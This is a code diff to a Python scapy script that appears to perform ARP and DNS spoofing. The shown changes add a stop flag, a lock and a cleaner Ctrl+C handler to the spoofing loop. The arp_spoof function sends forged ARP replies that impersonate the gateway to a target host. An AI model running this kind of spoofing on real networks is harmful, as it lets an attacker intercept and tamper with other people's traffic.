@@ -8,9 +8,13 @@ import argparse
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import srp
-from threading import Thread
+from threading import Thread, Lock
 from time import sleep
 import signal
+
+stop_flag = False
+
+lock = Lock()
 
 def process_args() -> Tuple[str, str, str]:
     parser = argparse.ArgumentParser()
@@ -71,11 +75,16 @@ def arp_spoof(target_mac: str, target_ip: str, gateway: str) -> None:
         pkt = ARP(op=2, pdst=target_ip, psrc=gateway, hwdst=target_mac)
         send(pkt, verbose=False)
         sleep(2)
+        with lock:
+            if stop_flag:
+                sys.exit(0)
 
 
 def sig_handler(signum, frame):
-    print("Ctrl + C.... Exiting")
-    sys.exit()
+    global stop_flag
+    stop_flag = True
+    print(".... Exiting")
+    sys.exit(0)
 
 def main() -> None:
     target_ip, spoof_ip, gateway = process_args()
